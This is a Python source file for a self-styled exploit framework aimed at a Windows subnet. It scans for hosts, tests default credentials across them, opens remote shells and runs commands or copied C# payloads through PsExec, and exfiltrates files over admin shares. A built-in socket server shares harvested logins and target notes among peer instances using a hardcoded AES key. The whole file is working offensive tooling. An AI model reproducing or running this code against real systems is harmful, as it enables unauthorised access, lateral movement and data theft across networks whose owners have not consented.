try:
    import os
    import time
    import sys
    import threading
    from threading import Thread
    import socket
    from Crypto.Cipher import AES
    import re
    import requests
    import zipfile
    import winsound
except ImportError as e:
    if e.name == "Crypto":
        print("You need PyCrypto! Get it with : pip install pycryptodome")
    if e.name == "requests":
        print("You need Requests! Get it with : pip install requests")
    else:
        print(e)
    input()
    sys.exit(0)

banner = r'''
  /$$$$$$  /$$$$$$$$ /$$$$$$$$
 /$$__  $$| $$_____/| $$_____/
| $$  \__/| $$      | $$
| $$      | $$$$$   | $$$$$
| $$      | $$__/   | $$__/
| $$    $$| $$      | $$
|  $$$$$$/| $$$$$$$$| $$
 \______/ |________/|__/
                          '''
validCommands = {
    "scan": ["Run a scan to identify hosts on the network","scan ([arp])"],
    "hosts": ["View or edit host information","hosts (update) (add/remove [ip] [list])"],
    "credtest": ["Test to see if default creds work","credtest [username:password] [list name to save under]"],
    "getcmd": ["Open a shell on a remote system (user / pass)","getcmd [ip] [username] [password]"],
    "rexec": ["Run a command on a single or a group of PCs (add default to use 'Default' list)","rexec [list name] [username:password] [command]"],
    "rcpy": ["rexec but copy and execute a file from this system","rcpy [list name] [username:password] [payload name] ([remote])"],
    "msg": ["Message a single or group of computers","msg [list name] [num times] "],
    "intel": ["View or edit intel on a given IP","intel [ip] ([add/remove] [information to add/remove])"],
    "source": ["Edit the list of shared intel","source [add/del/list] ([ip])"],
    "exfil": ["Exfiltrate data from a remote host","exfil [target] [username:password]"]

}

ipNames = []
customLists = []

completeFlags = []

intel = {"10.181.231.165": ["What a legend"]}
intelSources = []

regex_ipv4 = r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"

root_path = os.getcwd()
psexec_path = root_path + r"\tools\psexec.exe"
cs_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"

# CRYPTO INIT
key = b'\xb4y\xbd\xa0\xf2,\x1f~\x03\xb3\xef<7\xc4\xca\xde'
iv = b'C\xab\x8ef!C_\x13\xf5\xa2Z\xa0\xdaM\x19('

# =============================================================================
# =============================================================================
# ===== SERVER SIDE - HANDLE INCOMING CONNECTIONS AND DEAL WITH REQUESTS ======
# =============================================================================
# =============================================================================

def beep():
    winsound.Beep(1000, 250)

def getIntelSources():  # Read from the intel_sources.txt file who we share info with
    with open("intel_sources.txt", "r") as file:
        for line in file:
            intelSources.append(line.replace("\n", ""))


def addIntelSource(source_IP):
    intelSources.append(source_IP)
    writeIntelSources()

def delIntelSource(source_IP):
    try:
        intelSources.remove(source_IP)
    except Exception:
        print("Provided source not in the list")
    writeIntelSources()


def writeIntelSources():
    with open("intel_sources.txt", "w") as file:
        file.truncate()
        for i in range(len(intelSources)):
            file.write(intelSources[i] + "\n")




def readData(filename, intswitch=False):
    f = open(filename, "r")
    lines = f.readlines()
    f.close()
    totalRet = []
    for line in lines:
        data = line.split("|")
        header = data[0]
        ret = []
        for x in range(1, len(data)):
            if intswitch:
                ret.append(int(data[x].replace('\n', "")))
            else:
                ret.append(data[x].replace('\n', ""))
        totalRet.append([header, ret])
    return totalRet


def writeData(filename, data, writingList=True):
    os.remove(filename)
    f = open(filename, "a")
    for item in data:
        writeString = ""
        writeString += item[0]
        if writingList:
            for i in item[1]:
                writeString += "|" + str(i)
        else:
            for i in item[1]:
                writeString += "|" + str(i)
        writeString += "\n"
        f.write(writeString)
    f.close()


def intelInit():
    global customLists
    global ipNames
    global intel

    getIntelSources()
    if not os.path.exists("intel.txt"):
        with open("intel.txt", "w+") as file:
            file.write("")

    if not os.path.exists("hosts.txt"):
        with open("hosts.txt", "w+") as file:
            file.write("")

    ipInfo = readData("hosts.txt", True)
    for item in ipInfo:
        ipNames.append(item[0])
        customLists.append(item[1])

    intelInfo = readData("intel.txt")
    for item in intelInfo:
        intel[item[0]] = item[1]
    updateHosts()


def intelWrite(suppressMsg=False):
    global customLists
    global ipNames
    global intel
    ipInfo = []
    for x in range(0, len(ipNames)):
        ipInfo.append([ipNames[x], customLists[x]])
    writeData("hosts.txt", ipInfo)

    intelInfo = []
    for key in intel:
        intelInfo.append([key, intel[key]])
    writeData("intel.txt", intelInfo, False)
    if suppressMsg == False:
        print("\n[+] Intel updated")


def AES_pad(data):
    if len(data) % 16 == 0:
        return data
    databytes = bytearray(data)
    padding_required = 15 - (len(databytes) % 16)
    databytes.extend(b'\x80')
    databytes.extend(b'\x00' * padding_required)
    return bytes(databytes)


def AES_unpad(data):
    if not data:
        return data

    data = data.rstrip(b'\x00')
    if data[-1] == 128:  # b'\x80'[0]:
        return data[:-1]
    else:
        return data


def encryptAES(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = AES_pad(data.encode())
    return cipher.encrypt(data)


def decryptAES(data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = cipher.decrypt(data)
    return AES_unpad(data).decode()


def testCrypto(msg):
    code = encryptAES(msg)
    return (decryptAES(code))


def serverT():
    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = "0.0.0.0"
    port = 13370
    serverSock.bind((host, port))
    serverSock.listen(5)
    while True:
        try:
            clientsocket, address = serverSock.accept()
            client(clientsocket, address)
        except socket.error:
            pass


class client(Thread):
    def __init__(self, socket, address):
        Thread.__init__(self)
        self.localPC = None
        self.sock = socket
        self.addr = address
        self.start()

    def run(self):
        cmd = (self.sock.recv(1024).decode()).split("|")
        response = self.processRequest(cmd)
        self.sock.send(encryptAES(str(response)))

    def processRequest(self, cmd):
        global intel

        if cmd[0] == "update":
            host = cmd[1]
            info = cmd[2]
            if host in intel:
                if info not in intel[host]:
                    intel[host].append(info)
                    return "Done"
                else:
                    return "Done"
            else:
                intel[host] = [info]
                return "Done"

        if cmd[0] == "get":
            if cmd[1] == "ALLHOSTS":
                retstring = ""
                for i in range(0, len(ipNames)):
                    retstring += ipNames[i]
                    for x in range(0, len(customLists[i])):
                        retstring += "|" + str(customLists[i][x])
                    retstring += ","
                return(retstring[:-1])
            else:
                host = cmd[1]
                info = cmd[2]
                if host in intel:
                    return "|".join(intel[host])
                else:
                    return "No information at this time"


# =============================================================================
# =============================================================================
# === CLIENT SIDE - MAKE INFORMATION REQUESTS TO OTHER DEVICES RUNNING CEF ===
# =============================================================================
# =============================================================================


def makeRequest(ip, port, _type, subject, body):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    sock.connect((ip, port))
    packet = (_type + "|" + subject + "|" + body).encode()
    sock.send(packet)
    response = decryptAES(sock.recv(1024))
    sock.close()
    return response


def updateIntel(host, info, action="add", online=True, suppress=False):
    global intel
    if action == "add":
        if host in intel:
            if info not in intel[host]:
                intel[host].append(info)
        else:
            intel[host] = [info]
        if online:
            for comp in intelSources:
                makeRequest(comp, 13370, "update", host, info)
    if action == "remove":
        if host in intel:
            if info in intel[host]:
                intel[host].remove(info)
        if online:
            for comp in intelSources:
                makeRequest(comp, 13370, "remove", host, info)
    intelWrite(suppress)

def updateHosts():
    global ipNames
    global customLists
    print("\n[+] Loading host lists from network...")
    for comp in intelSources:
        try:
            remoteHosts = makeRequest(comp, 13370, "get", "ALLHOSTS", "")
            lists = remoteHosts.split(",")
            for list in lists:
                split = list.split("|")
                name = split[0]
                ips = []
                for x in range(1, len(split)):
                    ips.append(int(split[x]))
                if name in ipNames:
                    index = ipNames.index(name)
                    for ip in ips:
                        if ip not in customLists[index]:
                            customLists[index].append(ip)
                    customLists[index].sort()
                else:
                    ipNames.append(name)
                    customLists.append(ips)
        except:
            pass
    intelWrite()
    print("[+] Done")


def menu():
    global intel
    global customLists
    global ipNames
    os.system("cls")
    for line in banner:
        print(line, end="")
    print("\n[!] Type 'help' to see available commands, and 'usage' for syntax")

    while True:
        cmd = input("\n> ").split(" ")
        if cmd[0] == "help":
            print("\n[!] Available commands are:\n")
            for command in validCommands:
                print("%s :: %s" % (command, validCommands[command][0]))
            print("\n[!] Type 'usage' for info on how to run the commands\n")
            beep()

        if cmd[0] == "usage":
            print("\n[!] Usage is as follows:\n")
            for command in validCommands:
                print("%s :: %s" % (command, validCommands[command][1]))
            print("")
            beep()

        if cmd[0] == "getcmd":
            rconnect(cmd[1], cmd[2], cmd[3])

        if cmd[0] == "msg":
            targList = customLists[ipNames.index(cmd[1])]
            number = cmd[2]
            message = ""
            for x in range(3, len(cmd)):
                message += (cmd[x] + " ")
            rmsg(targList, message, number)

        if cmd[0] == "clear":
            os.system("cls")
            for line in banner:
                print(line, end="")
            print("\nCF EXPLOIT FRAMEWORK RC1")
            beep()

        if cmd[0] == "rexec":
            if len(cmd) == 4:
                targList = customLists[ipNames.index(cmd[1])]
                creds = cmd[2]
                command = cmd[3]
                rexec(targList, command, creds)

        if cmd[0] == "rcpy":
            if len(cmd) >= 4:
                targList = customLists[ipNames.index(cmd[1])]
                creds = cmd[2]
                payload = cmd[3]
                if len(cmd) >= 5 and cmd[4] == "remote":
                    rcpy(targList, payload, creds, True)
                else:
                    rcpy(targList, payload, creds)

        if cmd[0] == "scan":
            if len(cmd) == 2:
                if cmd[1] == "arp":
                    rscanarp()
            else:
                rscan()
            beep()

        if cmd[0] == "hosts":
            for x in range(0, len(ipNames)):
                if len(customLists[x]) == 0:
                    del customLists[x]
                    del ipNames[x]
                    intelWrite(suppressMsg=True)
            if len(cmd) == 1:
                if len(customLists) > 0:
                    print("\n[!] Showing host information")
                    print("|\n|__[+] TARGETS\n|  |\n|  |__" + str(customLists[0]).replace(" ", ""))
                    for i in range(1, len(ipNames)):
                        print("|\n|__[+] %s\n|  |\n|  |__%s" % (ipNames[i], str(customLists[i])))
                else:
                    print("\n[!] No hosts found, scan or run 'hosts update' to pull off the network")
            if len(cmd) == 2:
                if cmd[1] == "update":
                    updateHosts()
            if len(cmd) == 4:
                if cmd[1] == "remove":
                    if len(cmd) == 4:
                        if cmd[3] in ipNames:
                            targList = customLists[ipNames.index(cmd[3])]
                            if int(cmd[2]) in targList:
                                customLists[ipNames.index(cmd[3])].remove(int(cmd[2]))
                        intelWrite()
                        beep()

                if cmd[1] == "add":
                    if len(cmd) == 4:
                        if cmd[3] in ipNames:
                            targlist = customLists[ipNames.index(cmd[3])]
                            if cmd[3] not in targlist:
                                targlist.append(int(cmd[2]))
                        else:
                            customLists.append([int(cmd[2])])
                            ipNames.append(cmd[3])
                        intelWrite()
                        beep()
            beep()

        if cmd[0] == "credtest":
            try:
                credTest(cmd[1], cmd[2])
            except Exception:
                pass

        if cmd[0] == "intel":
            if len(cmd) == 2:
                try:
                    host = cmd[1]
                    getintel(host)
                    beep()
                except Exception:
                    pass
            if len(cmd) >= 3:
                host = cmd[1]
                cmnd = cmd[2]
                info = ""
                for x in range(3, len(cmd)):
                    info += cmd[x] + " "
                if cmnd == "add":
                    updateIntel(host, info, "add", False)
                if cmnd == "remove":
                    updateIntel(host, info, "remove", False)
                beep()

        if cmd[0] == "source":
            if cmd[1] == "add":
                if re.match(regex_ipv4, cmd[2]):
                    addIntelSource(cmd[2])
                else:
                    print("Not a valid IP address")
            if cmd[1] == "del":
                if re.match(regex_ipv4, cmd[2]):
                    delIntelSource(cmd[2])
                else:
                    print("Not a valid IP address")
            if cmd[1] == "list" or cmd[1] == "ls":
                print("\n[!] Showing intel sources")
                with open("intel_sources.txt", "r") as file:
                    for line in file:
                        print("|\n|__[+] %s" % line.replace("\n", ""))
                        beep()
        if cmd[0] == "exfil":
            if len(cmd) == 3:
                creds = cmd[2].split(":")
                exfil(cmd[1], "C$\\ProgramData\\Microsoft\\Windows",creds[0], creds[1])
            else:
                print("Incorrect usage: see \"usage\" command")


def getintel(host):
    returnIntel = []
    print("\n[!] Showing information for %s" % host)
    for comp in intelSources:
        try:
            info = makeRequest(comp, 13370, "get", host, "")
            print("|\n|__[+] Source: %s" % comp)
            if "|" in info:
                info = info.split("|")
            else:
                info = [info]
            for item in info:
                if item not in returnIntel:
                    if "No information" not in item:
                        updateIntel(host, item, False, suppress=True)
                        returnIntel.append(item)
                    print("|  |\n|  |__[+] %s" % item)
        except Exception:
            pass


def rconnect(target, uname, pword):
    print("\n[+] Spawning shell\n")
    os.system(psexec_path + r"-nobanner \\10.181.231.%s -u %s -p %s cmd.exe" % (target, uname, pword))


def credTest(creds="Profile:password", iplist="default"):
    global completeFlags
    global customLists
    global ipNames
    username = creds.split(":")[0]
    password = creds.split(":")[1]
    listIndex = 0
    if iplist not in ipNames:
        ipNames.append(iplist)
        customLists.append([])
    listIndex = ipNames.index(iplist)

    completeFlags = []
    index = 0
    for i in customLists[0]:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i, username, password, "hostname", index, True, listIndex))
        x.start()
        index += 1
    while 0 in completeFlags:
        pass

    customLists[listIndex].sort()
    os.system("cls")
    print("\n[+] Found %s devices with default credentials of %s" % (str(len(customLists[listIndex])), creds))
    print("[+] " + str(customLists[listIndex]).replace(" ", ""))
    loginString = "LOGIN: " + username + ":" + password
    for item in customLists[listIndex]:
        updateIntel("10.181.231." + str(item), loginString, action="add", online=False, suppress=True)
    for item in customLists[0]:
        if item not in customLists[listIndex]:
            updateIntel("10.181.231." + str(item), loginString, action="remove", online=False, suppress=True)
    if len(customLists[listIndex]) == 0:
        del customLists[listIndex]
        del ipNames[listIndex]

    intelWrite()


def rexec(targets, cmd, creds):
    global completeFlags
    completeFlags = []
    uname = creds.split(":")[0]
    password = creds.split(":")[1]
    index = 0
    for i in targets:
        completeFlags.append(0)
        x = threading.Thread(target=rexecT, args=(i, uname, password, cmd, index))
        x.start()
        time.sleep(.1)
        index += 1
    while 0 in completeFlags:
        pass
    print("\n[+] Done")


def rexecT(tgt=0, uname="", pword="", cmd="", index=0, sav=False, listIndex=0):  # The actual function for executing a command so that it can be threaded
    global completeFlags
    global customLists

    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s cmd /k "%s && exit" 2> nul' % (tgt, uname, pword, cmd)
    resp = os.system(psexecString)
    if sav and tgt not in customLists[listIndex]:
        infostring = "LOGIN: " + uname + ":" + pword
        if str(resp) == "0":
            customLists[listIndex].append(ending)

    completeFlags[index] = 1


def rcpy(targetList, payload, creds, args="", remote=False):
    global completeFlags
    global customLists
    completeFlags = []
    uname = creds.split(":")[0]
    password = creds.split(":")[1]
    index = 0
    if payload.endswith(".cs"):
        payload_cmd = ""
        if remote:
            payload_cmd = cs_path + " -target:winexe -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
        else:
            payload_cmd = cs_path + " -out:" + os.getcwd() + "\\payloads\\pl.exe " + os.getcwd() + "\\payloads\\" + payload
        payload = "payloads\\pl.exe"
        print(payload_cmd)
        os.system(payload_cmd + " " + args)
    for i in targetList:
        completeFlags.append(0)
        x = threading.Thread(target=rcpyT, args=(remote, i, uname, password, payload, index))
        x.start()
        time.sleep(.1)
        index += 1
    while 0 in completeFlags:
        pass
    print("\n[+] Done")
    os.remove("payloads/pl.exe")


def rcpyT(remote, tgt=0, uname="", pword="", payload="", index=0):  # The actual function for executing a command so that it can be threaded
    global completeFlags
    ending = tgt
    tgt = "10.181.231." + str(tgt)
    psexecString = ""
    if remote:
        psexecString = psexec_path + r' -nobanner \\%s -i -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
    else:
        psexecString = psexec_path + r' -nobanner \\%s -u %s -p %s -c %s"' % (tgt, uname, pword, payload)
    resp = os.system(psexecString)
    print(resp)
    completeFlags[index] = 1


def rscan():  # Conducts a ping scan to discover any hosts on the network
    global customLists
    if len(customLists) > 0:
        if ipNames[0] == "ips":
            customLists[0] = []
        else:
            for x in range(0, len(ipNames)):
                if ipNames[x] == "ips":
                    del ipNames[x]
                    del customLists[x]

            ipNames.insert(0, "ips")
            customLists.insert(0, [])
    else:
        ipNames.append("ips")
        customLists.append([])
    for i in range(100, 240):
        ip = "10.181.231." + str(i)
        if os.system("ping -n 1 -w 10 " + ip) == 0:
            customLists[0].append(i)
    scanComplete()


def rscanarp():  # Conducts an arp scan to discover any hosts on the network
    global customLists
    listIndex = 0
    if len(customLists) > 0:
        if ipNames[0] == "ips":
            customLists[0] = []
        else:
            for x in range(0, len(ipNames)):
                if ipNames[x] == "ips":
                    del ipNames[x]
                    del customLists[x]

            ipNames.insert(0, "ips")
            customLists.insert(0, [])
    else:
        ipNames.append("ips")
        customLists.append([])

    os.system("arp -a -n " + socket.gethostbyname(socket.gethostname()) + " > arp.txt")
    with open("arp.txt", "r") as file:
        for line in file:
            try:
                temp = line.split(" ")
                temp2 = temp[2].split(".")
                if "static" not in temp:
                    customLists[0].append(temp2[3])
            except IndexError:
                pass
    os.remove("arp.txt")
    scanComplete()


def scanComplete():
    os.system("cls")
    print("\n==================================================")
    print("\n[+] HOST SCAN COMPLETE")
    print("\n[+] DISCOVERED: " + str(len(customLists[0])))
    print("\n[+] RANGE: " + str(customLists[0][0]) + " -> " + str(customLists[0][-1]))
    print("\n==================================================\n")
    intelWrite()


def rmsg(targets, reason, num):
    print("")
    for t in range(0, num):
        for i in targets:
            target = "10.181.231." + str(i)
            x = threading.Thread(target=rmsgT, args=(reason, target))
            x.start()


def rmsgT(reason="", target=""):
    print("[+] MESSAGING:", target)
    os.system(r'msg Admin /SERVER %s %s' % (target, reason))


def exfil(target, path, usr, passwd):
    targetpath = "\\\\10.181.231." + target + "\\" + path
    print(targetpath)
    if not os.path.exists("\\exfil"):
        os.system("mkdir exfil")
    os.system(r'net use m: ' + targetpath + ' /user:' + usr + " " + passwd)
    try:
        os.system("move " + '"M:\Start Menu\Programs\StartUp\*.txt" ' + os.getcwd() + "\\exfil\\")
    except Exception as ex:
        print("Unable to copy file. %s" % ex)
    finally:
        os.system('net use m: /del /Y')


def getDependencies():
    if not os.path.exists(psexec_path):  # Get PSExec if you don't have it in path
        print("Do you want to install PSExec? (Required dependency) [Y/n]")
        if not input() == "n":
            response = requests.get(r"https://download.sysinternals.com/files/PSTools.zip")
            if response.ok:
                print("Getting pstools dependency...")
                file = open("pstools.zip", "wb+")  # write, binary, allow creation
                file.write(response.content)
                file.close()
                with zipfile.ZipFile(r"pstools.zip", 'r') as zip_ref:
                    zip_ref.extractall(root_path + r"\pstools")
                os.remove("pstools.zip")
                os.system("cd " + root_path + r"\pstools & " + 'for %i in (*) do if not "%~i" == "PsExec.exe" del "%~i"')
                os.system("rename pstools tools")
            else:
                print("Failed to get PSExec dependency")
    if not os.path.exists(cs_path):
        print("Do you want to install C# Compiler? (For payloads) [Y/n]")
        if not input() == "n":
            response = requests.get(r"https://go.microsoft.com/fwlink/?linkid=2088517")
            if response.ok:
                print("Getting csc dependency...")
                os.system(r"ndp48-devpack-enu.exe")
                print("Follow .NET framework install instructions in external window")
            else:
                print("Failed to get csc dependency")


if __name__ == "__main__":
    x = threading.Thread(target=serverT)
    x.start()
    getDependencies()
    intelInit()
    time.sleep(1)
    menu()
